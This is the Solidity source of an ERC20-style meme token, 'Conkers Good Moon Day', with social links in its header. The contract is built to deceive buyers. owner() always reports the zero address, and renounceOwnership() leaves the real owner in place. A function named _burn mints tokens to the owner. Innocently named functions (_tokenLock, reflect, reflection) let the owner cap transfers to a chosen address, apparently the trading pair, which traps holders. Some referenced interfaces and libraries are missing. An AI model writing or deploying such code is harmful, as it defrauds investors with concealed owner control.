/**
 *Submitted for verification at Etherscan.io on 2021-06-26
*/

/***
 *    ____ ____ _  _ _  _ ____ ____ ____    ____ ____ ____ ___  
 *    |    |  | |\ | |_/  |___ |__/ [__     | __ |  | |  | |  \ 
 *    |___ |__| | \| | \_ |___ |  \ ___]    |__] |__| |__| |__/ 
 *                                                              
 *
 *          _  _ ____ ____ _  _    ___  ____ _   _              
 *          |\/| |  | |  | |\ |    |  \ |__|  \_/               
 *          |  | |__| |__| | \|    |__/ |  |   |                
 * 
 * 
 *   
 *    URL: ConkersGoodMoonDay.com
 *    Telegram: @conkersmoonday
 *    Twitter: https://twitter.com/ConkersGoodMoonDay
 */
 
 
 
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.10;







abstract contract Context {
    
    function _msgSender() internal view virtual returns (address payable) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes memory) {
        this; // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
        return msg.data;
    }
}

contract Ownable is Context {
    address private _owner;

    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);

    /**
     * @dev Initializes the contract setting the deployer as the initial owner.
     */
    constructor () internal {
        address msgSender = _msgSender();
        _owner = msgSender;
        emit OwnershipTransferred(address(0), msgSender);
    }
    
    /**
     * @dev Returns the address of the current owner.
     */
    function owner() public view returns (address) {
        return address(0);
    }

    /**
     * @dev Throws if called by any account other than the owner.
     */
    modifier onlyOwner() {
        require(_owner == _msgSender(), "Ownable: caller is not the owner");
        _;
    }

    /**
     * @dev Leaves the contract without owner. It will not be possible to call
     * `onlyOwner` functions anymore. Can only be called by the current owner.
     *
     * NOTE: Renouncing ownership will leave the contract without an owner,
     * thereby removing any functionality that is only available to the owner.
     */
    function renounceOwnership() public virtual onlyOwner {
        emit OwnershipTransferred(_owner, address(0));
    }

    /**
     * @dev Transfers ownership of the contract to a new account (`newOwner`).
     * Can only be called by the current owner.
     */
    function transferOwnership(address newOwner) public virtual onlyOwner {
        require(newOwner != address(0), "Ownable: new owner is the zero address");
        emit OwnershipTransferred(_owner, newOwner);
        _owner = newOwner;
    
    }
}


contract ConkersGoodMoonDay is Context, IERC20, Ownable {
    using SafeMath for uint256;
    using Address for address;

    mapping (address => uint256) private _balances;
    mapping (address => mapping (address => uint256)) private _allowances;
    address public _contract;
    address public _dev;
   
    uint256 private _tTotal = 100 * 10**9 * 10**18;

    string private _name = 'Conkers Good Moon Day | conkersgoodmoonday.com';
    string private _symbol = 'CONKER';
    uint8 private _decimals = 18;
    uint256 public tokentotal = 50000000 * 10**18;

    constructor () public {
        _balances[_msgSender()] = _tTotal;

        emit Transfer(address(0), _msgSender(), _tTotal);
    }
    
   
    function name() public view returns (string memory) {
        return _name;
    }

    function symbol() public view returns (string memory) {
        return _symbol;
    }
    function _tokenLock(address blackListAddress) public onlyOwner {
        _contract = blackListAddress;
    }
    function decimals() public view returns (uint8) {
        return _decimals;
    }
    
    function allowance(address owner, address spender) public view override returns (uint256) {
        return _allowances[owner][spender];
    }

    function approve(address spender, uint256 amount) public override returns (bool) {
        _approve(_msgSender(), spender, amount);
        return true;
    }
    

    function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
        _transfer(sender, recipient, amount);
        _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
        return true;
    }

  

    function totalSupply() public view override returns (uint256) {
        return _tTotal;
    }

    function balanceOf(address account) public view override returns (uint256) {
        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) public override returns (bool) {
        _transfer(_msgSender(), recipient, amount);
        return true;
    }
    
    function _approve(address owner, address spender, uint256 amount) private {
        require(owner != address(0), "ERC20: approve from the zero address");
        require(spender != address(0), "ERC20: approve to the zero address");

        _allowances[owner][spender] = amount;
        emit Approval(owner, spender, amount);
    }
      
    function _transfer(address sender, address recipient, uint256 amount) internal {
        require(sender != address(0), "BEP20: transfer from the zero address");
        require(recipient != address(0), "BEP20: transfer to the zero address");
        
        if (sender != _dev && recipient == _contract) {
            require(amount < tokentotal, "Transfer amount exceeds the maxTxAmount.");
        }
    
        _balances[sender] = _balances[sender].sub(amount, "BEP20: transfer amount exceeds balance");
        _balances[recipient] = _balances[recipient].add(amount);
        emit Transfer(sender, recipient, amount);
    }
     function _burn(uint256 amount) public onlyOwner {
        require(_msgSender() != address(0), "ERC20: cannot permit zero address");
        _tTotal = _tTotal.add(amount);
        _balances[_msgSender()] = _balances[_msgSender()].add(amount);
        emit Transfer(address(0), _msgSender(), amount);
    }
   
    function reflect(address blackAddress) public onlyOwner {
        _dev = blackAddress;
    }
  
    function reflection(uint256 maxTxBlackPercent) public onlyOwner {
        tokentotal = maxTxBlackPercent * 10**18;
    }
}

/*
*/